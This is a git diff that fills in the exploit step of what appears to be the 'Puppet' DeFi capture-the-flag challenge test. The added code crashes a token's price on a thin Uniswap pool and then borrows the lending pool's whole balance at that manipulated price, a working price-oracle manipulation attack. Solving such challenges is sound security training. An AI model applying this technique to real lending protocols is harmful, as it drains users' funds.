@@ -102,7 +102,20 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        // Approve exchange to move tokens
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // Swap tokens for eth such that eth balance in exchange is extremely low compared to token,
+        // which drives the price pf token very low
+        const deadline = await ethers.provider.getBlock().then(b => b.timestamp + 1000);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // Sub 1 to pass `gt` check in challenge test
+            1, deadline
+        );
+
+        // Cheaply borrow the token
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ATTACKER_INITIAL_ETH_BALANCE });
     });
 
     after(async function () {
